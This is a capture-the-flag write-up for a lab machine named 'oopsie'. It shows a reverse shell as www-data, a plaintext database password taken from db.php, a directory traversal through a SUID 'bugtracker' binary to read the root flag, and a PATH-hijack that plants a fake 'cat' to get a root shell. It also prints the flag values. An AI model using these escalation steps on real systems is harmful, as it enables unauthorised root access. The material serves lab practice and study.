# user.txt
Via the reverse shell connection as www-data
```
$ cd /home/
$ ls
robert
$ cd robert
$ ls -l
total 4
-rw-r--r-- 1 robert robert 33 Feb 25  2020 user.txt
$ cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
```

## Credentials found for robert
```
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

```

These credentials work for (at least) ssh

# root flag
Using the bugtracker executable, directory traversal can be used to get the root flag.
```
robert@oopsie:~$ /usr/bin/bugtracker 

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ../../root/*.txt
---------------

af13b0bee69f8a877c3faf667f7beacf

```

# Bonus: getting a root shell
The output from bugtracker shows that `cat` doesn't have a full path listed to the `cat` binary.

The attacker can create an executable `cat` that spawns a shell. Since bugtracker has a suid as root, it should be a root shell.

```
robert@oopsie:~$ which bash
/bin/bash
robert@oopsie:~$ which cat
/bin/cat

# Make a new cat binary and prepend it to robert's path
robert@oopsie:~$ vim cat
robert@oopsie:~$ /bin/cat /home/robert/cat
/bin/bash
robert@oopsie:~$ chmod +x cat
robert@oopsie:~$ export PATH=/home/robert:$PATH

### Run the bugtracker and get a root shell
robert@oopsie:~$ bugtracker 

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: pwned
---------------

root@oopsie:~# id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)

```